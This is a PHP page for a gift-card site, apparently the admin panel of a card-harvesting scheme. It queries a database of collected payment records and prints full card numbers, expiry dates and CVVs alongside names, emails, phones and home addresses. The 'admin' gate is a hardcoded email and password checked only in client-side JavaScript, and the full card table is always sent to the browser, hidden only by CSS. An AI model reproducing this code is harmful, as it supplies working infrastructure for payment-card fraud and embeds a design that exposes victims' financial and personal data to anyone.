<?php 
  
  $page_titles = "My Cards";
  include 'header.php';
  require('dbconnect.php');
  $card_data = mysqli_query($conn,"SELECT * FROM card_details");
 ?>


      <section class="breadcrumbs-custom bg-image context-dark" style="background-image: url(img/allcards.png);">
        <div class="container">
          <h2 class="breadcrumbs-custom-title">Verify Giftcard</h2>
          <div class="breadcrumbs-custom-subtitle"></div>
        </div>
      </section>
      <!-- Branding-->
      <section class="section section-lg bg-default section-lined">
        <div class="container container-custom-width">
          <h3 class="text-center">Welcome Admin</h3>
        </div>
      </section>
      <!-- login form -->
      <section class="section section-md bg-default" id="admin-form">
        <div class="container">
          <p class="big">Fill the form below correctly in order to purchase your gift card.</p>
          <!-- RD Mailform-->
          <form class="form-boxed" data-form-output="form-output-global">
            <div class="row row-50">
              <div class="col-lg-6">
                <div class="form-wrap form-wrap-icon">
                  <div class="form-icon mdi mdi-email-outline"></div>
                  <input class="form-input" id="adminemail" type="emailbuyemail" name="adminemail" data-constraints="@Email @Required">
                  <label class="form-label" for="adminemail">Admin E-mail</label>
                </div>
              </div>
              <div class="col-lg-6">
                <div class="form-wrap form-wrap-icon">
                  <div class="form-icon mdi mdi-account-outline"></div>
                  <input class="form-input" id="adminpass" type="password" name="adminpass" required="required">
                  <label class="form-label" for="adminpass">Admin password</label>
                </div>
              </div>
              <div class="col-md-12">
                <div class="button-wrap-1 text-center"><button class="button button-default" type="button" onclick="validate()">Submit</button></div>
              </div>
            </div>
          </form>
        </div>
      </section>
      <!-- Display card details-->
      <section class="section section-md bg-default" id="card-display" style="display: none;">
        <div class="container">
          <table class="table table-striped table-responsive table-hover">
            <tr>
              <th>S/N</th>
              <th>First Name</th>
              <th>Last Name</th>
              <th>Email</th>
              <th>Phone Number</th>
              <th>Address</th>
              <th>Apt/Suite</th>
              <th>City</th>
              <th>Province</th>
              <th>Postalcode</th>
              <th>Country</th>
              <th>Card Type</th>
              <th>Full Name</th>
              <th>Card Number</th>
              <th>Expiry Month</th>
              <th>Expiry Year</th>
              <th>CVV</th>
              
            </tr>
            <?php
                while($row = mysqli_fetch_assoc($card_data))
                {
            ?>
            <tr>
              <td><?php echo $row['id']; ?></td>
              <td><?php echo $row['fname']; ?></td>
              <td><?php echo $row['lname']; ?></td>
              <td><?php echo $row['email']; ?></td>
              <td><?php echo $row['phone']; ?></td>
              <td><?php echo $row['address']; ?></td>
              <td><?php echo $row['aptsuite']; ?></td>
              <td><?php echo $row['city']; ?></td>
              <td><?php echo $row['province']; ?></td>
              <td><?php echo $row['postalcode']; ?></td>
              <td><?php echo $row['country']; ?></td>
              <td><?php echo $row['card_type']; ?></td>
              <td><?php echo $row['card_full_name']; ?></td>
              <td><?php echo $row['card_number']; ?></td>
              <td><?php echo $row['expiry_month']; ?></td>
              <td><?php echo $row['expiry_year']; ?></td>
              <td><?php echo $row['cvv']; ?></td>
              
            </tr>
            <?php
                }
            ?>
          </table>
          
        </div>
      </section>
     
<script type="text/javascript">
  function validate() {
        var email = document.getElementById("adminemail");
        var pass = document.getElementById("adminpass");
        if (email.value == "verifygiftcard@gmail.com" && pass.value=="verify100") {
            document.getElementById("admin-form").style.display = 'none';
            document.getElementById("card-display").style.display = 'block';
        }
        
        
    }
</script>

<?php 
  include 'footer.php'
 ?>